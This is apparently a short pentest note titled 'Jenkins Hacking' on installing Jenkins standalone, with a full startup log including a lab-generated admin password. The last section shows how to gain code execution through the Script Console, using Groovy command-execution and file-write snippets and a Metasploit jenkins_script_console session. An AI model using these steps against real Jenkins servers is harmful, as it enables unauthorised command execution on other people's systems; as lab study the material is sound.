**Authors**: < [nixawk](https://github.com/nixawk) >


# Jenkins Hacking

1. How to deploy jenkins ?
2. How to exploit jenkins server ?


Jenkins is a self-contained, open source automation server which can be used to automate all sorts of tasks such as building, testing, and deploying software. Jenkins can be installed through native system packages, Docker, or even run standalone by any machine with the Java Runtime Environment installed.


## How to deploy jenkins ?

This guided tour will use the "standalone" Jenkins distribution which requires a minimum of Java 7, though Java 8 is recommended. A system with more than 512MB of RAM is also recommended.

1. [Download Jenkins](http://mirrors.jenkins.io/war-stable/latest/jenkins.war).
2. Open up a terminal in the download directory and run java -jar jenkins.war
3. Browse to http://localhost:8080 and follow the instructions to complete the installation.
4. Many Pipeline examples require an installed Docker on the same computer as Jenkins.

Please check the install log as follow.

```
root@lab:~/Downloads# java -jar jenkins.war
Running from: /root/Downloads/jenkins.war
webroot: $user.home/.jenkins
Mar 15, 2017 5:03:49 AM Main deleteWinstoneTempContents
WARNING: Failed to delete the temporary Winstone file /tmp/winstone/jenkins.war
Mar 15, 2017 5:03:50 AM org.eclipse.jetty.util.log.JavaUtilLog info
INFO: Logging initialized @6168ms
Mar 15, 2017 5:03:50 AM winstone.Logger logInternal
INFO: Beginning extraction from war file
Mar 15, 2017 5:04:05 AM org.eclipse.jetty.util.log.JavaUtilLog warn
WARNING: Empty contextPath
Mar 15, 2017 5:04:06 AM org.eclipse.jetty.util.log.JavaUtilLog info
INFO: jetty-9.2.z-SNAPSHOT
Mar 15, 2017 5:04:10 AM org.eclipse.jetty.util.log.JavaUtilLog info
INFO: NO JSP Support for /, did not find org.eclipse.jetty.jsp.JettyJspServlet
Jenkins home directory: /root/.jenkins found at: $user.home/.jenkins
Mar 15, 2017 5:04:20 AM org.eclipse.jetty.util.log.JavaUtilLog info
INFO: Started w.@30990c1b{/,file:/root/.jenkins/war/,AVAILABLE}{/root/.jenkins/war}
Mar 15, 2017 5:04:20 AM org.eclipse.jetty.util.log.JavaUtilLog info
INFO: Started ServerConnector@54227100{HTTP/1.1}{0.0.0.0:8080}
Mar 15, 2017 5:04:20 AM org.eclipse.jetty.util.log.JavaUtilLog info
INFO: Started @36602ms
Mar 15, 2017 5:04:20 AM winstone.Logger logInternal
INFO: Winstone Servlet Engine v2.0 running: controlPort=disabled
Mar 15, 2017 5:04:22 AM jenkins.InitReactorRunner$1 onAttained
INFO: Started initialization
Mar 15, 2017 5:04:23 AM jenkins.InitReactorRunner$1 onAttained
INFO: Listed all plugins
Mar 15, 2017 5:04:45 AM jenkins.InitReactorRunner$1 onAttained
INFO: Prepared all plugins
Mar 15, 2017 5:04:45 AM jenkins.InitReactorRunner$1 onAttained
INFO: Started all plugins
Mar 15, 2017 5:04:45 AM jenkins.InitReactorRunner$1 onAttained
INFO: Augmented all extensions
Mar 15, 2017 5:04:51 AM jenkins.InitReactorRunner$1 onAttained
INFO: Loaded all jobs
Mar 15, 2017 5:04:51 AM hudson.model.AsyncPeriodicWork$1 run
INFO: Started Download metadata
Mar 15, 2017 5:04:52 AM org.jenkinsci.main.modules.sshd.SSHD start
INFO: Started SSHD at port 43731
Mar 15, 2017 5:04:53 AM jenkins.InitReactorRunner$1 onAttained
INFO: Completed initialization
Mar 15, 2017 5:04:55 AM org.springframework.context.support.AbstractApplicationContext prepareRefresh
INFO: Refreshing org.springframework.web.context.support.StaticWebApplicationContext@4d8c4701: display name [Root WebApplicationContext]; startup date [Wed Mar 15 05:04:55 EDT 2017]; root of context hierarchy
Mar 15, 2017 5:04:55 AM org.springframework.context.support.AbstractApplicationContext obtainFreshBeanFactory
INFO: Bean factory for application context [org.springframework.web.context.support.StaticWebApplicationContext@4d8c4701]: org.springframework.beans.factory.support.DefaultListableBeanFactory@16f7f485
Mar 15, 2017 5:04:55 AM org.springframework.beans.factory.support.DefaultListableBeanFactory preInstantiateSingletons
INFO: Pre-instantiating singletons in org.springframework.beans.factory.support.DefaultListableBeanFactory@16f7f485: defining beans [authenticationManager]; root of factory hierarchy
Mar 15, 2017 5:04:58 AM org.springframework.context.support.AbstractApplicationContext prepareRefresh
INFO: Refreshing org.springframework.web.context.support.StaticWebApplicationContext@1aa6a1d4: display name [Root WebApplicationContext]; startup date [Wed Mar 15 05:04:58 EDT 2017]; root of context hierarchy
Mar 15, 2017 5:04:58 AM org.springframework.context.support.AbstractApplicationContext obtainFreshBeanFactory
INFO: Bean factory for application context [org.springframework.web.context.support.StaticWebApplicationContext@1aa6a1d4]: org.springframework.beans.factory.support.DefaultListableBeanFactory@26dbd965
Mar 15, 2017 5:04:58 AM org.springframework.beans.factory.support.DefaultListableBeanFactory preInstantiateSingletons
INFO: Pre-instantiating singletons in org.springframework.beans.factory.support.DefaultListableBeanFactory@26dbd965: defining beans [filter,legacy]; root of factory hierarchy
Mar 15, 2017 5:04:59 AM jenkins.install.SetupWizard init
INFO:

*************************************************************
*************************************************************
*************************************************************

Jenkins initial setup is required. An admin user has been created and a password generated.
Please use the following password to proceed to installation:

e019dca34bac4a30beca67b53e821f35

This may also be found at: /root/.jenkins/secrets/initialAdminPassword

*************************************************************
*************************************************************
*************************************************************

Mar 15, 2017 5:05:06 AM hudson.model.UpdateSite updateData
INFO: Obtained the latest update center data file for UpdateSource default
Mar 15, 2017 5:05:09 AM hudson.model.DownloadService$Downloadable load
INFO: Obtained the updated data file for hudson.tasks.Maven.MavenInstaller
Mar 15, 2017 5:05:09 AM hudson.model.UpdateSite updateData
INFO: Obtained the latest update center data file for UpdateSource default
Mar 15, 2017 5:05:10 AM hudson.WebAppMain$3 run
INFO: Jenkins is fully up and running
Mar 15, 2017 5:05:10 AM javax.jmdns.impl.HostInfo newHostInfo
WARNING: Could not intialize the host network interface on nullbecause of an error: lab: lab: Temporary failure in name resolution
java.net.UnknownHostException: lab: lab: Temporary failure in name resolution
	at java.net.InetAddress.getLocalHost(InetAddress.java:1505)
	at javax.jmdns.impl.HostInfo.newHostInfo(HostInfo.java:75)
	at javax.jmdns.impl.JmDNSImpl.<init>(JmDNSImpl.java:407)
	at javax.jmdns.JmDNS.create(JmDNS.java:60)
	at hudson.DNSMultiCast$1.call(DNSMultiCast.java:33)
	at jenkins.util.ContextResettingExecutorService$2.call(ContextResettingExecutorService.java:46)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.net.UnknownHostException: lab: Temporary failure in name resolution
	at java.net.Inet6AddressImpl.lookupAllHostAddr(Native Method)
	at java.net.InetAddress$2.lookupAllHostAddr(InetAddress.java:928)
	at java.net.InetAddress.getAddressesFromNameService(InetAddress.java:1323)
	at java.net.InetAddress.getLocalHost(InetAddress.java:1500)
	... 9 more

Mar 15, 2017 5:05:18 AM hudson.model.DownloadService$Downloadable load
INFO: Obtained the updated data file for hudson.tools.JDKInstaller
Mar 15, 2017 5:05:18 AM hudson.model.AsyncPeriodicWork$1 run
INFO: Finished Download metadata. 27,508 ms


```

Please attention here, we need the password to finish setup.

```
Jenkins initial setup is required. An admin user has been created and a password generated.
Please use the following password to proceed to installation:

e019dca34bac4a30beca67b53e821f35
```

## How to exploit jenkins server ?

access http://127.0.0.1:8080/script, and pwn the jenkins server with Script Console.

> Script Console

> Type in an arbitrary Groovy script and execute it on the server. Useful for trouble-shooting and diagnostics. Use the ‘println’ command to see the output (if you use System.out, it will go to the server’s stdout, which is harder to see.) Example:


### **execmd.groovy**

**execmd.groovy** can help you execute os command on jenkins server.

```
# Windows

println "cmd.exe /c dir".execute().text


# Linux

println "uname -a".execute().text

```

### **writefile.groovy**

**writefile.groovy** can write strings into a file on jenkins server.

```
new File("/tmp/test.sh").write("""
echo "123"
echo "456"
""")
```

If you prefer [metasploit-framework](https://github.com/rapid7/metasploit-framework),

```
msf > use exploit/multi/http/jenkins_script_console
msf exploit(jenkins_script_console) > show options

Module options (exploit/multi/http/jenkins_script_console):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   password         no        The password for the specified username
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      192.168.1.100    yes       The target address
   RPORT      8080             yes       The target port
   TARGETURI  /                yes       The path to jenkins
   USERNAME   test             no        The username to authenticate as
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   1   Linux
msf exploit(jenkins_script_console) > exploit
```


## References

1. https://jenkins.io/
